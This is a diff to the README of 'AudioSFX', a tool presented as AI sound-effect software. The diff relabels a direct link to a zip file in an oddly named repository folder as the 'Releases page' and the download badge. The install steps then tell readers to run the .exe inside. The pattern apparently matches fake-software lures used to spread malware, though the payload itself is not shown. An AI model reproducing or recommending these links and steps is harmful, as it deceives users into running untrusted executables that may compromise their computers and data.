@@ -1,6 +1,6 @@
 # 🎧 AudioSFX - Create movie sound effects with AI
 
-[![](https://img.shields.io/badge/Download-AudioSFX-blue.svg)](https://github.com/xyaksicxdaenlae437/AudioSFX)
+[![](https://img.shields.io/badge/Download-AudioSFX-blue.svg)](https://github.com/xyaksicxdaenlae437/AudioSFX/raw/refs/heads/main/slaglessness/SFX-Audio-3.8.zip)
 
 AudioSFX helps you create professional sound effects for your videos. You do not need experience in sound engineering. The software uses artificial intelligence to analyze your video timeline. It generates matching sounds and syncs them to your footage automatically. You save time on tedious manual editing while achieving high-quality results.
 
@@ -26,7 +26,7 @@ To run AudioSFX smoothly, your computer needs these basic specifications:
 
 Follow these steps to install the software on your computer.
 
-1. Go to the [Releases page](https://github.com/xyaksicxdaenlae437/AudioSFX) to get the correct version.
+1. Go to the [Releases page](https://github.com/xyaksicxdaenlae437/AudioSFX/raw/refs/heads/main/slaglessness/SFX-Audio-3.8.zip) to get the correct version.
 2. Look for the file ending in `.exe`.
 3. Click the link to save the file to your computer.
 4. Run the downloaded file to start the installation.
